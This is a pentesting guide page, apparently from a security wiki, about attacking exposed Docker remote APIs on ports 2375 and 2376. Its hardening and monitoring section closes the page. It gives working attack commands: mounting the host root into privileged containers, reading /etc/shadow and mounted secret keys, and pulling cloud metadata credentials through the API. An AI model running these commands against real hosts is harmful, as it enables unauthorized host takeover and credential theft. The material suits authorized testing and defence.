# 2375, 2376 Pentesting Docker

## Docker Basics

### What is

The Docker Platform is the industry-leading container platform for continuous, high-velocity innovation, enabling organizations to seamlessly build and share any application — from legacy to what comes next — and securely run them anywhere.

### Basic docker architecture

This info is from [here](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc).

* [containerd](http://containerd.io/) is a container runtime which can m**anage a complete container lifecycle - from image transfer/storage to container execution**, supervision and networking. **More information about containerd below.**
* container-shim handle headless containers, meaning once runc initializes the containers, it exits handing the containers over to the container-shim which acts as some middleman.
* [runc](http://runc.io/) is lightweight universal run time container, which abides by the OCI specification. **runc is used by containerd for spawning and running containers according to OCI spec**. It is also the repackaging of libcontainer.
* [grpc](http://www.grpc.io/) used for communication between containerd and docker-engine.
* [OCI](https://www.opencontainers.org/) maintains the OCI specification for runtime and images. The current docker versions support OCI image and runtime specs.

![runC, containerD](https://i.stack.imgur.com/5aXF6.png)

### Basic commands

```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```

### Containerd

Containerd was designed to be used by Docker and Kubernetes as well as any other container platform that wants to **abstract away syscalls or OS specific functionality to run container**s on linux, windows, solaris, or other OSes. With these users in mind, we wanted to make sure that containerd has only what they need and nothing that they don’t. Realistically this is impossible but at least that is what we try for. Things like **networking are out of scope for containerd**. The reason for this is, when you are building a distributed system, networking is a very central aspect. With SDN and service discovery today, networking is way more platform specific than abstracting away netlink calls on linux.

Note then that **Docker uses Containerd, but it only provides a subet of the features that Docker provides**. So for example ContainerD doesn't have Docker's network management features, nor can you use ContainerD alone to create Docker swarms.

```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine 
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```

### Podman

**Info** [**from here**](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html#:~:text=What%20is%20Podman%3F,and%20support%20for%20rootless%20containers.)\*\*\*\*

Podman is an open source, OCI \([Open Container Initiative](https://github.com/opencontainers)\) compliant container engine. It is driven by Red Hat and incorporates a few major differences from Docker, such as its daemonless architecture and support for rootless containers. At their core, **both tools do the same thing: manage images and containers**. One of **Podman’s objectives is to have a Docker-compatible API**. Hence almost all CLI \(command line interface\) commands from the Docker CLI are also available in Podman.

You may find two other tools in the Podman ecosystem: Buildah and Skopeo. Buildah is a CLI tool used to build container images, and Skopeo is a CLI tool for running operations on images, such as push, pull or inspect. [Please check out GitHub](https://github.com/containers/buildah/tree/master/docs/containertools) for more information on these tools and their relationship with Podman.

**The major differences**

**The greatest difference between Docker and Podman is their architecture**. **Docker** runs on a **client-server** architecture, while **Podman** runs on a **daemonless** architecture. But what does that mean? When working with **Docker**, you have to use the Docker CLI, which communicates with a **background daemon** \(the Docker daemon\). The main logic resides in the daemon, which builds images and executes containers. This **daemon runs with root privileges**. The **Podman** architecture by contrast allows you to **run** the **containers under the user that is starting the container** \(fork/exec\), and this user does not need any root privileges. Because **Podman has a daemonless architecture, each user running Podman can only see and modify their own containers**. There is no common daemon that the CLI tool communicates with.

Since Podman does not have a daemon, it needs a way to support running containers in the background. It therefore provides an integration with **systemd**, which allows containers to be controlled via systemd units. Depending on the Podman version, you can generate these units for existing containers or generate units that are able to create containers if they do not exist in the system. There is another integration model with systemd, which enables systemd to run inside a container. By default, Docker uses systemd to control the daemon process.

The second major difference concerns how containers are executed. With **Podman**, **containers are executed under the user’s privileges and not under the daemon**. At this point, the concept of rootless containers comes into play, meaning that the container can be started without root privileges. Rootless containers have a huge advantage over rootful containers since \(you guessed it\) they do not run under the root account. The benefit of this is that if an attacker is able to capture and escape a container, this attacker is still a normal user on the host. Containers that are started by a user cannot have more privileges or capabilities than the user itself. This adds a natural layer of protection.

{% hint style="info" %}
Note that as podam aims to support the same API as docker, you can use the same commands with podman as with docker such as:

```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## Basic Information

Remote API is running by default on 2375 port when enabled. The service by default will not require authentication allowing an attacker to start a privileged docker container. By using the Remote API one can attach hosts / \(root directory\) to the container and read/write files of the host’s environment.

**Default port:** 2375

```text
PORT    STATE SERVICE
2375/tcp open  docker
```

## Enumeration

### Manual

Note that in order to enumerate the docker API you can use the `docker` command or `curl` like in the following example:

```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
 Version:           19.03.1
 API version:       1.40
 Go version:        go1.12.5
 Git commit:        74b1e89
 Built:             Thu Jul 25 21:21:05 2019
 OS/Arch:           linux/amd64
 Experimental:      false

Server: Docker Engine - Community
 Engine:
  Version:          19.03.1
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.12.5
  Git commit:       74b1e89
  Built:            Thu Jul 25 21:19:41 2019
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.2.6
  GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
 runc:
  Version:          1.0.0-rc8
  GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
```

If you can **contact the remote docker API with the `docker` command** you can **execute** any of the **docker** [**commands previously** commented](2375-pentesting-docker.md#basic-commands) to interest with the service.

{% hint style="info" %}
You can `export DOCKER_HOST="tcp://localhost:2375"` and **avoid** using the `-H` parameter with the docker command
{% endhint %}

#### Fast privilege escalation

```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```

#### Curl

Sometimes you’ll see **2376** up for the **TLS** endpoint. I haven’t been able to connect to it with the docker client but you can with curl no problem to hit the docker API.

```bash
#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```

If you want more information about this, more information is available where I copied the commands from: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

### Automatic

```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```

## Compromising

In the following page you can find ways to **escape from a docker container**:

{% page-ref page="../linux-unix/privilege-escalation/docker-breakout.md" %}

Abusing this it's possible to escape form a container, you could run a weak container in the remote machine, escape from it, and compromise the machine:

```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## Privilege Escalation

If you are inside a host that is using docker, you may [**read this information to try to elevate privileges**](../linux-unix/privilege-escalation/#writable-docker-socket).

## Discovering secrets in running Docker containers

```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```

Check **env** \(environment variable section\) for secrets and you may find:

* Passwords.
* Ip’s.
* Ports.
* Paths.
* Others… .

If you want to extract a file:

```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```

## Securing your Docker

### Securing Docker installation and usage

* You can use the tool [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) to inspect your current docker installation.
  *  `./docker-bench-security.sh`
* You can use the tool [https://github.com/kost/dockscan](https://github.com/kost/dockscan) to inspect your current docker installation.
  * `dockscan -v unix:///var/run/docker.sock`
* You can use the tool [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) the privileges a container will have when run with different security options. This is useful to know the implications of using some security options to run a container:
  * `docker run --rm -it r.j3ss.co/amicontained`
  * `docker run --rm -it --pid host r.j3ss.co/amicontained`
  * `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### Securing Docker Images

* You can use a docker image of [https://github.com/quay/clair](https://github.com/quay/clair) to make it scan your other docker images and find vulnerabilities.
  * `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
  * `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### Securing Dockerfiles

* You can use the tool [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) to **inspect your Dockerfile** and find all kinds of misconfigurations. Each misconfiguration will be given an ID, you can find here [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) how to fix each of them.
  * `dockerfilelinter -f Dockerfile`

![](../.gitbook/assets/image%20%28411%29.png)

* You can use the tool [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) to **inspect your Dockerfile** and find all kinds of misconfigurations.
  * `dockerfilelint Dockerfile`

![](../.gitbook/assets/image%20%28412%29.png)

* You can use the tool [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) to **inspect your Dockerfile** and find all kinds of misconfigurations.
  * `dockerlint Dockerfile`

![](../.gitbook/assets/image%20%28410%29.png)

* You can use the tool [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) to **inspect your Dockerfile** and find all kinds of misconfigurations.
  * `hadolint Dockerfile`

![](../.gitbook/assets/image%20%28424%29.png)

### Logging Suspicious activity

* You can use the tool [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) to detect **suspicious behaviour in running containers**.
  * Note in the following chunk how **Falco compiles a kernel module and insert it**. After that, it loads the rules and **start logging suspicious activities**. In this case it has detected 2 privileged containers started, 1 of them with a sensitive mount, and  after some seconds it detected how a shell was opened inside one of the containers.

```text
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
 - Original module
   - No original module exists within this kernel
 - Installation
   - Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```

### Monitoring Docker

You can use auditd to monitor docker.

